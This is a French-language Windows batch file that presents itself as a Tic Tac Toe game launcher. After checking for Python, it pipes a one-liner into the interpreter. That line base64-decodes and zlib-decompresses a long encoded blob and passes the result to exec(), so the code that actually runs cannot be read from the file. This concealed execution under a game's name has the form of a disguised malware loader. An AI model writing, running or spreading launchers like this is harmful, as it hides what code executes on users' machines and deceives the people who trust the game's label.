@echo off
title Tic Tac Toe
echo Lancement du jeu Tic Tac Toe...

REM Vérifier si Python est installé
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo ERREUR: Python n'est pas installé
    echo Téléchargez Python depuis: https://python.org
    echo Installez Python avec l'option "Add to PATH"
    pause
    exit /b 1
)

REM Décompresser et exécuter le code Python
echo import base64,zlib,sys;exec(zlib.decompress(base64.b64decode("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")).decode('utf-8')) | python
if %errorlevel% neq 0 (
    echo Une erreur s'est produite lors de l'exécution
    pause
)
